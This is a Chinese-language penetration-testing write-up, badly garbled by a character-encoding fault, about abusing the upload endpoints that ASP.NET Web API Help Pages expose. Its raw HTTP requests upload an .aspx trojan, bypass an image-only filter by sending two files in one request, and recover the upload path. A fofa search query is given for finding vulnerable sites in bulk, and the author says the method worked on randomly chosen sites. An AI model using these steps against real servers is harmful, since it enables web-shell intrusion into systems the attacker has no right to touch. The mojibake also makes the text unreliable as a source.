# åˆ©ç”¨ASP.NET Web API Help Pageæ–‡ä»¶ä¸Šä¼ 
# å…è´£è¯´æ˜ï¼š
##
ç”±äºä¼ æ’­ã€åˆ©ç”¨æœ¬æ–‡ç« æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ï¼Œä¸€æ—¦é€ æˆåæœè¯·è‡ªè¡Œæ‰¿æ‹…ï¼å¦‚æœ‰ä¾µæƒçƒ¦è¯·å‘ŠçŸ¥ï¼Œæˆ‘ä¼šç«‹å³åˆ é™¤å¹¶è‡´æ­‰ï¼Œè°¢è°¢ï¼
## 0x0å‰è¨€
å‰æ®µæ—¶é—´åœ¨ä¸€æ¬¡æ”»é˜²æ¼”ç»ƒä¸­å‘ç°æœ‰å‡ ä¸ªèµ„äº§ç›®æ ‡ä½¿ç”¨çš„æ˜¯ASP.NET Web
APIï¼Œå½“æ—¶ä»¥ä¸ºæ˜¯ä¸€ä¸ªç®€å•çš„æœªæˆæƒæ¼æ´ï¼Œåé¢æƒ³ç€å¯ä¸å¯ä»¥åˆ©ç”¨å¸®åŠ©æ–‡æ¡£ä¸­çš„uploadä¸Šä¼ æ¥å£ï¼Œå¯¹æ•°æ®åŒ…è¿›è¡Œä¸€ä¸ªç®€å•çš„æ„é€ è¿›è¡Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å‘¢ï¼Œäºæ˜¯äº§ç”Ÿäº†è¿™ç¯‡æ–‡ç« 
## 0x1å…³äºASP.NET Web API
æ ¹æ®Microsoftå®˜æ–¹æ–‡æ¡£ç»™å‡ºçš„è§£é‡Šå¦‚ä¸‹ï¼š The ASP.NET Web API Help Page automatically generates
help page content for the web APIs on your site. Visitors to your help page
can use this content to learn how to call your web APIs. Everything generated
by the help page is fully customizable using ASP.NET MVC and Razor. ASP.NET
Web API Help Page is a great addition to any ASP.NET Web API project.
ç®€å•æ¥è¯´å°±æ˜¯ï¼š ASP.NET Web API å¸®åŠ©é¡µé¢æ˜¯ä»»ä½• ASP.NET Web API é¡¹ç›®çš„ç»ä½³è¡¥å……
é‚£ä¹ˆåˆ›å»ºASP.NET Web API åˆ›å»ºå¸®åŠ©é¡µé¢æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæ ¹æ®Microsoftç»™å‡ºçš„è§£é‡Šå¦‚ä¸‹ï¼š When you create a web API,
it is often useful to create a help page, so that other developers will know
how to call your API. You could create all of the documentation manually, but
it is better to autogenerate as much as possible. To make this task easier,
ASP.NET Web API provides a library for auto-generating help pages at run time.  
æœ€åå¾—åˆ°çš„ç•Œé¢å¦‚ä¸‹
åˆæˆ–è€…æ˜¯å¦‚ä¸‹
## 0x2å¯»æ‰¾çªç ´å£
æˆ‘ä»¬æ­¤æ¬¡éœ€è¦æ„é€ çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åŒ…ï¼Œæˆ‘ä»¬å…¨å±€æœç´¢uploadã€ä¸Šä¼ ã€æ–‡ä»¶ï¼Œfileç­‰ç›¸å…³å­—æ ·
å¯ä»¥çœ‹åˆ°å¦‚å›¾æ‰€ç¤ºæˆ‘ä»¬æ‰¾åˆ°äº†ç›¸å…³çš„å­—æ ·
æ ¹æ®æ–‡æ¡£æç¤ºï¼šæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ­¤å¤„æ–‡æ¡£ä¸Šä¼ æ„é€ æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦è¿›è¡Œä¸€ä¸ªpostå‚æ•°çš„æ„é€ ï¼Œæ‰‹å·¥æ„é€ æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™æ—¶å€™æˆ‘æƒ³èµ·äº†å¼€å‘è€…å¸¸ç”¨çš„ä¸€ä¸ªå·¥å…·postmanï¼Œå…³äºpostmanï¼Œæˆ‘åœ¨è¿™é‡Œä¹Ÿç®€å•è¿›è¡Œä¸€ä¸ªä»‹ç»ï¼š
Postmanæ˜¯ä¸€ä¸ªæ¥å£æµ‹è¯•å·¥å…·,åœ¨åšæ¥å£æµ‹è¯•çš„æ—¶å€™,Postmanç›¸å½“äºä¸€ä¸ªå®¢æˆ·ç«¯,å®ƒå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘èµ·çš„å„ç±»HTTPè¯·æ±‚,å°†è¯·æ±‚æ•°æ®å‘é€è‡³æœåŠ¡ç«¯,è·å–å¯¹åº”çš„å“åº”ç»“æœ,
ä»è€ŒéªŒè¯å“åº”ä¸­çš„ç»“æœæ•°æ®æ˜¯å¦å’Œé¢„æœŸå€¼ç›¸åŒ¹é…;å¹¶ç¡®ä¿å¼€å‘äººå‘˜èƒ½å¤ŸåŠæ—¶å¤„ç†æ¥å£ä¸­çš„bug,è¿›è€Œä¿è¯äº§å“ä¸Šçº¿ä¹‹åçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚
å®ƒä¸»è¦æ˜¯ç”¨æ¥æ¨¡æ‹Ÿå„ç§HTTPè¯·æ±‚çš„(å¦‚:get/post/delete/put..ç­‰ç­‰),Postmanä¸æµè§ˆå™¨çš„åŒºåˆ«åœ¨äºæœ‰çš„æµè§ˆå™¨ä¸èƒ½è¾“å‡ºJsonæ ¼å¼,è€ŒPostmanæ›´ç›´è§‚æ¥å£è¿”å›çš„ç»“æœã€‚
## 0X3å¼€å§‹æ„é€ 
å…³äºå¦‚ä½•ä½¿ç”¨ï¼Œæˆ‘è¿™é‡Œå¼•ç”¨äº†ä¸€éåšä¸»çš„æ–‡ç« æ–‡ç« åœ°å€å¦‚ä¸‹
æœ€åé€‰æ‹©sendå‘é€
å¯ä»¥çœ‹å‡ºæˆ‘ä»¬æ­¤æ—¶çš„æ–‡ä»¶å·²ç»ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯è·¯å¾„æ‰¾ä¸åˆ°å…ˆç®€å•fuzzä¸€æ³¢
ç»è¿‡ç®€å•çš„fuzzæˆ‘å¾—åˆ°äº†ä¸€ä¸ªå«UpLoadFilesè·¯å¾„
è¿™ä¸å¾—ä¸ä½©æœæˆ‘çš„å­—å…¸çš„å¼ºå¤§ï¼Œå½“ç„¶ä¹Ÿå½’åŠŸäºå¹³æ—¶çš„å½’çº³æ€»ç»“
é€šè¿‡å¯¹postmanä»£ç†çš„è®¾ç½®
æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹è¿™ä¸ªæ•°æ®åŒ…çš„æ„æˆ
    POST /xxxx/ImgFormUpload HTTP/1.1
    User-Agent: PostmanRuntime/7.29.2
    Accept: */*
    Postman-Token: xxxxxxxxxxxxx
    Host: 192.168.22.23
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: multipart/form-data; boundary=--------------------------997110380267407431328989
    Content-Length: 255
    ----------------------------997110380267407431328989
    Content-Disposition: form-data; name=""; filename="test11.aspx"
    Content-Type: application/octet-stream
    ----------------------------997110380267407431328989--    
ç”¨burpé‡æ”¾ä¸€ä¸‹
è¿™ä¸å¾—æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Ÿè¿™æ¬¡æ˜¯è·¯å¾„æ˜¯æˆ‘è‡ªå·±fuzzå‡ºæ¥çš„ï¼Œæœ‰æ²¡æœ‰å…¶ä»–çš„æ¥å£èƒ½ç›´æ¥è¿”å›è·¯å¾„å‘¢ï¼Ÿ
## 0x4å¯»æ‰¾å…¶ä»–æ¥å£
ç»è¿‡ä¸€ç•ªçš„å¯»æ‰¾ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€å¤„
å‘ç°è¿™é‡Œæ ¹æœ¬åªèƒ½ä¸Šä¼ å›¾ç‰‡
å°è¯•ä¸Šä¼ å›¾ç‰‡è¯•ä¸€ä¸‹
å¯ä»¥çœ‹å‡ºä¸Šä¼ å›¾ç‰‡è¿”å›äº†è·¯å¾„ï¼Œæƒ³åŠæ³•ç»•è¿‡ç»è¿‡ä¸€ç•ªå®éªŒï¼Œæˆ‘å‘ç°å¯ä»¥ä½¿ç”¨aspç«™ç‚¹ç»å¸¸ä½¿ç”¨çš„åŒæ–‡ä»¶ä¸Šä¼ ç»•è¿‡
æ„é€ å¦‚ä¸‹
æ­¤æ—¶çš„æ•°æ®åŒ…å¦‚ä¸‹
    POST /xxxxx/UpLoadImgToNews HTTP/1.1
    User-Agent: PostmanRuntime/7.29.2
    Accept: */*
    Postman-Token: xxxxxxxxxxxxxxx
    Host: 192.168.22.23
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: multipart/form-data; boundary=--------------------------747868501381474511362162
    Content-Length: 6482
    ----------------------------747868501381474511362162
    Content-Disposition: form-data; name=""; filename="test11.aspx"
    Content-Type: application/octet-stream
    ----------------------------747868501381474511362162
    Content-Disposition: form-data; name=""; filename="hha.jpg"
    Content-Type: image/jpeg
    Â¹6Â¼ÃœÂ‹Â–Ã­Ã”Ã£0Ã˜pÃ¡aÃ‹Ã„ÂµCdÂ®z Ã¡Â¡Ã©dX
luH#q^ÃƒÂ‰Â—wfDÂ¼Â«Â¯
    ÂŠÂ’N OÃ®Â¬!UbÂµesKyÃ¬EÃ‹
rÃŸÂ‚ÂÃ¨PÂ‘Â‚Ã”Ã Ã‚ÃNÃªÂ¨!ÃµÂ­Ã’Ã¶Ã‘Ã°ÃŠÃ‚Â¥_f_Ã«Ãš
qÂ¹=jÃ ?Â“&Â¶^Ã¬ÂŒ
    RuÂ!Ã¶{#fÃ¼i_Ã¸SÃ¡ÂÂ/Ã©w
    Ã¯;Â°ÂœÃ´Ã¬ Â«
Â¬Â¦_dÂ¡Â¤ÂSÃˆÂµ!uÂ€CÂ´Â—Ã˜YÂ¬=Ã‡Ã¸Ã”    Â¸ÂŠÃÂ(Âˆ
    ----------------------------747868501381474511362162--    
è¿”å›åŒ…
    HTTP/1.1 200 OK
    Cache-Control: no-cache
    Pragma: no-cache
    Content-Type: application/json; charset=utf-8
    Expires: -1
    Server: Microsoft-IIS/8.5
    X-AspNet-Version: 4.0.30319
    X-Powered-By: ASP.NET
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
    Access-Control-Allow-Headers: Content-Type,Origin, X-Requested-With
    Date: Wed, 07 Sep 2022 04:29:16 GMT
    Connection: close
    Content-Length: 26
    "/upload/20220907/hha.jpg"
æœ¨é©¬è·¯å¾„ï¼š
## 0x5fofaæ‰¹é‡æœç´¢
    fofaï¼š"Web API " && icon_hash="1772087922"
ç»è¿‡éšæœºæµ‹è¯•äº†å‡ ä¸ªç½‘ç«™å‘ç°éƒ½å¯ä»¥ç”¨æ­¤ç±»ä¼¼çš„æ–¹æ³•è¿›è¡Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œæœ‰äº›ç«™ç‚¹ç›´æ¥è¿”å›è·¯å¾„
test1ï¼š
postmanæ„é€ è¯·æ±‚
    POST /api/Files/PostFiles HTTP/1.1
    User-Agent: PostmanRuntime/7.29.2
    Accept: */*
    Postman-Token: xxxxxxxxxxxxxxx
    Host: xxxxxxxxxxx
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: multipart/form-data; boundary=--------------------------076647936634298195979552
    Content-Length: 255
    ----------------------------076647936634298195979552
    Content-Disposition: form-data; name=""; filename="test11.aspx"
    Content-Type: application/octet-stream
    ----------------------------076647936634298195979552--
## 0x6æœ€å
æ€»ç»“ä¸€ä¸‹ï¼š
0x1ï¼šå¦‚æœç½‘ç«™æœ‰é‰´æƒè¿™éœ€è¦åˆ©ç”¨å…¶ä»–æ¥å£è·å–ç®¡ç†å‘˜tokenï¼Œæœ‰çš„å¯ä»¥ï¼Œæœ‰çš„ä¸è¡Œ
0x2ï¼šä¸ªäººæ„Ÿè§‰è¿™ä¸ªæ´æ¯”è¾ƒé¸¡è‚‹ï¼Œå› ä¸ºç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½åšäº†é‰´æƒå¤„ç†ï¼Œä¸€å®šç¨‹åº¦ä¸Šè¿˜éœ€è¦è¿æ°”
## å‚è€ƒæ–‡ç« 